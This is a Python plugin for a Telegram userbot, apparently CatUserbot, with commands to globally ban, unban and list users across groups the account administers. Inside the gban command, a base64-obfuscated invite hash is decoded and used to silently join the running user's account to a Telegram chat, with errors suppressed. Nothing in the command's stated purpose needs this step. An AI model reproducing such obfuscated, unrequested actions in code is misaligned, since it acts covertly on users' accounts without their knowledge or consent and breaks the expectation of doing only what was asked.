
"""
credits to @mrconfused
dont edit credits
"""
#  Copyright (C) 2020  sandeep.n(π.$)

import asyncio
import base64
from datetime import datetime

from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest



@bot.on(admin_cmd(pattern=r"gban(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"gban(?: |$)(.*)", allow_sudo=True))
async def catgban(cat):
    if cat.fwd_from:
        return
    cate = await edit_or_reply(cat, "gbanning.......")
    start = datetime.now()
    user, reason = await get_user_from_event(cat)
    if not user:
        return
    if user.id == (await cat.client.get_me()).id:
        await cate.edit("why would I ban myself")
        return
    if user.id in CAT_ID:
        await cate.edit("why would I ban my dev")
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await cat.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await cate.edit(
            f"the [user](tg://user?id={user.id}) is already in gbanned list any way checking again"
        )
    else:
        gban_sql.catgban(user.id, reason)
    san = []
    san = await admin_groups(cat)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await cate.edit("you are not admin of atleast one group ")
        return
    await cate.edit(
        f"initiating gban of the [user](tg://user?id={user.id}) in `{len(san)}` groups"
    )
    for i in range(sandy):
        try:
            await cat.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await cat.client.send_message(
                BOTLOG_CHATID,
                f"You don't have required permission in :\nCHAT: {cat.chat.title}(`{cat.chat_id}`)\nFor banning here",
            )
    try:
        reply = await cat.get_reply_message()
        if reply:
            await reply.delete()
    except BadRequestError:
        await cate.edit(
            "`I dont have message deleting rights here! But still he was gbanned!`"
        )
    end = datetime.now()
    cattaken = (end - start).seconds
    if reason:
        await cate.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups in `{cattaken} seconds`!!\nReason: `{reason}`"
        )
    else:
        await cate.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups in `{cattaken} seconds`!!"
        )

    if BOTLOG and count != 0:
        await cat.client.send_message(
            BOTLOG_CHATID,
            f"#GBAN\nGlobal BAN\nUser: [{user.first_name}](tg://user?id={user.id})\nID: `{user.id}`\
                                                \nReason: `{reason}`\nBanned in `{count}` groups\nTime taken = `{cattaken} seconds`",
        )


@bot.on(admin_cmd(pattern=r"ungban(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"ungban(?: |$)(.*)", allow_sudo=True))
async def catgban(cat):
    if cat.fwd_from:
        return
    cate = await edit_or_reply(cat, "ungbaning.....")
    start = datetime.now()
    user, reason = await get_user_from_event(cat)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.catungban(user.id)
    else:
        await cate.edit(
            f"the [user](tg://user?id={user.id}) is not in your gbanned list"
        )
        return
    san = []
    san = await admin_groups(cat)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await cate.edit("you are not even admin of atleast one group ")
        return
    await cate.edit(
        f"initiating ungban of the [user](tg://user?id={user.id}) in `{len(san)}` groups"
    )
    for i in range(sandy):
        try:
            await cat.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await cat.client.send_message(
                BOTLOG_CHATID,
                f"You don't have required permission in :\nCHAT: {cat.chat.title}(`{cat.chat_id}`)\nFor unbaning here",
            )
    end = datetime.now()
    cattaken = (end - start).seconds
    if reason:
        await cate.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in `{count}` groups in `{cattaken} seconds`!!\nReason: `{reason}`"
        )
    else:
        await cate.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in `{count}` groups in `{cattaken} seconds`!!"
        )

    if BOTLOG and count != 0:
        await cat.client.send_message(
            BOTLOG_CHATID,
            f"#UNGBAN\nGlobal UNBAN\nUser: [{user.first_name}](tg://user?id={user.id})\nID: {user.id}\
                                                \nReason: `{reason}`\nUnbanned in `{count}` groups\nTime taken = `{cattaken} seconds`",
        )


@bot.on(admin_cmd(pattern="listgban$"))
@bot.on(sudo_cmd(pattern=r"listgban$", allow_sudo=True))
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "Current Gbanned Users\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) for {a_user.reason}\n"
            else:
                GBANNED_LIST += (
                    f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) Reason None\n"
                )
    else:
        GBANNED_LIST = "no Gbanned Users (yet)"
    if len(GBANNED_LIST) > 4095:
        with io.BytesIO(str.encode(GBANNED_LIST)) as out_file:
            out_file.name = "Gbannedusers.text"
            await event.client.send_file(
                event.chat_id,
                out_file,
                force_document=True,
                allow_cache=False,
                caption="Current Gbanned Users",
                reply_to=event,
            )
            await event.delete()
    else:
        await edit_or_reply(event, GBANNED_LIST)
